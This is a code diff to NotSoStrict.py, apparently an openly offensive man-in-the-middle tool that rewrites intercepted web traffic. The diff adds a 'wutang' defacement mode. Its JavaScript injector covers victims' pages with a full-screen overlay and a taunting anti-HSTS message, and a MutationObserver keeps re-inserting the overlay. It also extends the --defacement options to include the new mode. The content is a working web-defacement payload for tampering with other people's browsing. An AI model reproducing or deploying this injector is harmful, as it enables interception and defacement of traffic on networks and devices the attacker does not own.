@@ -2,7 +2,7 @@
 """
 NotSoStrict.py
 
-Version 2
+Version 2.1
 
 More info at https://github.com/0ber1n/NotSoStrict
 
@@ -133,7 +133,73 @@ def enable_nat(mode):
 def write_inject_js(defacement_mode):
     print(f"[*] Writing JS injector ({defacement_mode}) to {INJECT_JS_PATH}")
 
-    if defacement_mode == "fullscreen":
+    if defacement_mode == "wutang":
+        js_code = r"""(function(){
+            function inject(){
+                try {
+                    if (document.getElementById('mitm-fullscreen-overlay')) return;
+
+                    var overlay = document.createElement('div');
+                    overlay.id = 'mitm-fullscreen-overlay';
+                    overlay.setAttribute('style',
+                        'position:fixed;top:0;left:0;width:100vw;height:100vh;' +
+                        'background:#ffeb3b;color:#000;font-family:monospace;' +
+                        'display:flex;flex-direction:column;align-items:center;justify-content:center;' +
+                        'z-index:2147483647;text-align:center;' +
+                        'padding:20px;font-size:20px;line-height:1.3;' +
+                        'animation:fadeIn 0.7s ease-out;'
+                    );
+
+                    var art = document.createElement('pre');
+                    art.setAttribute('style',
+                        'font-size:14px;line-height:1.1;margin-bottom:20px;white-space:pre;'
+                    );
+                    art.textContent =
+"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⡀⠀⠀⠀\n" +
+"⠀⢀⣶⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⡄⠀⠀\n" +
+"⠀⣼⣿⣿⣿⣿⣿⣿⣿⣷⣶⡤⠀⠀⠀⠀⢤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀\n" +
+"⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⢀⣀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀\n" +
+"⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠰⣾⣿⣿⣷⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
+"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
+"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
+"⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿\n" +
+"⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇\n" +
+"⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀\n" +
+"⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀\n" +
+"⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⡄⠀⠀⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀\n" +
+"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⣸⣿⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀\n" +
+"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀";
+
+                    var msg = document.createElement('div');
+                    msg.setAttribute('style',
+                        'font-size:30px;font-weight:bold;margin-top:20px;'
+                    );
+                    msg.textContent = "HSTS AINT NOTHIN' TO F&%K WITH";
+
+                    overlay.appendChild(art);
+                    overlay.appendChild(msg);
+
+                    var style = document.createElement('style');
+                    style.innerHTML =
+                        '@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }';
+
+                    document.documentElement.appendChild(style);
+                    document.documentElement.appendChild(overlay);
+                } catch (e) {}
+            }
+
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', inject);
+            } else {
+                inject();
+            }
+
+            try {
+                new MutationObserver(inject)
+                    .observe(document.documentElement, {childList: true, subtree:true});
+            } catch (e) {}
+        })();"""
+    elif defacement_mode == "fullscreen":
         js_code = r"""(function(){
             function inject(){
                 try {
@@ -177,6 +243,7 @@ def write_inject_js(defacement_mode):
             } catch (e) {}
         })();"""
     else:
+        # default: banner
         js_code = r"""(function(){
             function insertBanner(){
                 try {
@@ -353,7 +420,7 @@ def main():
     )
     parser.add_argument(
         "--defacement",
-        choices=["banner", "fullscreen"],
+        choices=["banner", "fullscreen", "wutang"],
         default="banner",
         help="Choose the defacement type: banner or fullscreen overlay"
     )
